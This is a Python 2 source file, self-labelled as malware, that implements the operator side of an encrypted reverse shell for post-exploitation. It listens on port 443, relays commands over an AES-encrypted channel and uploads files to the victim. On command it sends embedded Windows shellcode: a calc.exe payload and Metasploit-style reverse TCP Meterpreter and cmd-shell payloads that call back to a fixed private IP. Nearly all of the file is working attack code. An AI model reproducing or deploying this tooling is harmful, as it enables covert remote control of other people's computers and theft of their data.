#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
    @Malware
    ST2Labs / GEO SYSTEM SOFTWARE

    Python Reverse Shell / Post-Explotation

    ; Client for Python Reverse Shell

"""
import sys
import base64
import socket
import os
import re
from Crypto.Cipher import AES
from Crypto import Random

#Crypt Class
class AESCipher:

    def __init__(self, key, blk_sz):
        self.key = key
        self.blk_sz = blk_sz

    def encrypt( self, raw ):
        if raw is None or len(raw) == 0:
            return ''
        raw = raw + '\0' * (self.blk_sz - len(raw) % self.blk_sz)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return base64.b64encode( iv + cipher.encrypt( raw ) )

    def decrypt( self, enc ):
        if enc is None or len(enc) == 0:
            return ''
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return re.sub('\0*$','', cipher.decrypt( enc[16:]))



#Hack Methods

#Run a calc on windows
def calc() :
    shellcode = "\xd9\xe8\xba\x0e\xd4\x73\x25\xd9\x74\x24\xf4\x5f\x31"+\
                "\xc9\xb1\x33\x31\x57\x17\x03\x57\x17\x83\xc9\xd0\x91"+\
                "\xd0\x29\x30\xdc\x1b\xd1\xc1\xbf\x92\x34\xf0\xed\xc1"+\
                "\x3d\xa1\x21\x81\x13\x4a\xc9\xc7\x87\xd9\xbf\xcf\xa8"+\
                "\x6a\x75\x36\x87\x6b\xbb\xf6\x4b\xaf\xdd\x8a\x91\xfc"+\
                "\x3d\xb2\x5a\xf1\x3c\xf3\x86\xfa\x6d\xac\xcd\xa9\x81"+\
                "\xd9\x93\x71\xa3\x0d\x98\xca\xdb\x28\x5e\xbe\x51\x32"+\
                "\x8e\x6f\xed\x7c\x36\x1b\xa9\x5c\x47\xc8\xa9\xa1\x0e"+\
                "\x65\x19\x51\x91\xaf\x53\x9a\xa0\x8f\x38\xa5\x0d\x02"+\
                "\x40\xe1\xa9\xfd\x37\x19\xca\x80\x4f\xda\xb1\x5e\xc5"+\
                "\xff\x11\x14\x7d\x24\xa0\xf9\x18\xaf\xae\xb6\x6f\xf7"+\
                "\xb2\x49\xa3\x83\xce\xc2\x42\x44\x47\x90\x60\x40\x0c"+\
                "\x42\x08\xd1\xe8\x25\x35\x01\x54\x99\x93\x49\x76\xce"+\
                "\xa2\x13\x1c\x11\x26\x2e\x59\x11\x38\x31\xc9\x7a\x09"+\
                "\xba\x86\xfd\x96\x69\xe3\xf2\xdc\x30\x45\x9b\xb8\xa0"+\
                "\xd4\xc6\x3a\x1f\x1a\xff\xb8\xaa\xe2\x04\xa0\xde\xe7"+\
                "\x41\x66\x32\x95\xda\x03\x34\x0a\xda\x01\x57\xcd\x48"+\
                "\xc9\xb6\x68\xe9\x68\xc7"
    return shellcode

#Reverse TCP Meterpreter to specific IP
def meterpreter() :
    shellcode =     "\xfc\xe8\x86\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b"+\
                    "\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"+\
                    "\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"+\
                    "\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b"+\
                    "\x42\x3c\x8b\x4c\x10\x78\xe3\x4a\x01\xd1\x51\x8b\x59"+\
                    "\x20\x01\xd3\x8b\x49\x18\xe3\x3c\x49\x8b\x34\x8b\x01"+\
                    "\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0"+\
                    "\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58"+\
                    "\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"+\
                    "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"+\
                    "\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x89\x5d\x68\x33"+\
                    "\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"+\
                    "\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"+\
                    "\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40"+\
                    "\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0"+\
                    "\xa8\x00\x1e\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56"+\
                    "\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff"+\
                    "\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00"+\
                    "\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36"+\
                    "\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4"+\
                    "\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02"+\
                    "\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec"+\
                    "\xc3"
    return shellcode

#Reverse TCP Shell to specific IP
def meterpreter() :
    shellcode =  "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b"+\
                 "\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"+\
                 "\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"+\
                 "\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b"+\
                 "\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0"+\
                 "\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b"+\
                 "\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01"+\
                 "\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2"+\
                 "\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"+\
                 "\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b"+\
                 "\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86"+\
                 "\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68"+\
                 "\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4"+\
                 "\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50"+\
                 "\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7"+\
                 "\x68\xc0\xa8\x00\x1e\x68\x02\x00\x11\x5c\x89\xe6\x6a"+\
                 "\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d"+\
                 "\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56"+\
                 "\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10"+\
                 "\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"+\
                 "\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56"+\
                 "\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5"+\
                 "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"+\
                 "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"+\
                 "\xff\xd5"
    return shellcode

# Decode Base64 data
def decode(data):
    if len(data) % 4 != 0:  # check if multiple of 4
        while len(data) % 4 != 0:
            data = data + "="
        req_str = base64.b64decode(data)
    else:
        req_str = base64.b64decode(data)
    return req_str

# Set handler connection, option sents data with Cipher+Base64
def option(con, aes, cmd):
    encrypt_msg = aes.encrypt(cmd); #Cipher with AES256
    con.send(base64.b64encode(encrypt_msg)) #Encode msg
    data = con.recv(8192) #Get data
    req_str = decode(data) #Decode msg
    msg = aes.decrypt( req_str ); #DeCipher with AES256
    return msg

# Decode Cipher+Base64 data
def decodeCipher(aes, data):
    if len(data) % 4 != 0:  # check if multiple of 4
        while len(data) % 4 != 0:
            data = data + "="
        req_str = base64.b64decode(data)
    else:
        req_str = base64.b64decode(data)
    msg = aes.decrypt( req_str ) 
    return msg
 
 
# Encode Cipher+Base64 data
def encodeCipher(aes, data):
    encryp_msg = aes.encrypt(data)
    return base64.b64encode(encryp_msg)

#Sent File Method
def sent(con, fileName):
    f = open(fileName,'rb')
    print f
    print 'Sending...'
    l = f.read(1024)
    while (l):
        print 'Sending...'
        con.send(l)
        l = f.read(1024)
    f.close()
    con.send('File has been sent')
    print "Done Sending"


def main():
    #CipherAES Object
    aes = AESCipher( 'enf1JTGj1qjWaJD3agH2yyYnviHM05YGVLP852UkO0wwHw0Fa0'[:16], 32) #50 Characs
    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to the address given on the command line
    server_address = ('', 443)
    sock.bind(server_address)
    print >>sys.stderr, ''
    print >>sys.stderr, ' [*] Starting up on %s port %s' % sock.getsockname()
    sock.listen(1)

    #Hack code ShellCode
    code = "0"
    while True:
        print >>sys.stderr, ''
        print >>sys.stderr, '   - Waiting for a connection'
        print >>sys.stderr, '     Press CRTL+C to exit'
        con, client_address = sock.accept()
        try:
            print >>sys.stderr, '   - Client connected:', client_address
            data = con.recv(4096) #Set to 4096 the buffer command, to allow send shellcode
            data = decodeCipher(aes, data)
            print '   {}'.format(data)
            print >>sys.stderr, ''
            while True:
                cmd = raw_input("Enter command: ")
                if cmd:
                    if cmd == 'upload':
                        req_str = option(con, aes, cmd)
                        fileName = raw_input("¿Cual es la ruta del fichero?: ")
                        fileDest = raw_input("¿Cual es el nombre que quiere que tenga en el destino (indique ext): ")
                        req_str = option(con, aes, fileDest)
                        sent(con, fileName)
                    if code == "1" and cmd == "meterpreter":
                        cmd = meterpreter()
                        code = "0"
                        req_str = option(con, aes, cmd)
                        print >>sys.stderr, ''
                        print >>sys.stderr, '%s' % req_str
                        print >>sys.stderr, ''
                        break
                    if code == "1" and cmd == "calc":
                        cmd = calc()
                        code = "0"
                        req_str = option(con, aes, cmd)
                        print >>sys.stderr, ''
                        print >>sys.stderr, '%s' % req_str
                        print >>sys.stderr, ''
                        break
                    if code == "1":
                        cmd = "error"
                        code = "0"
                    if cmd == 'hack':
                        code = "1"
                    req_str = option(con, aes, cmd)
                    print >>sys.stderr, ''
                    print >>sys.stderr, '%s' % req_str
                    print >>sys.stderr, ''
                    if cmd == "quit":
                        break
        except KeyboardInterrupt:
            sys.exit(2)
        finally:
            con.close()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
            sys.exit(2)
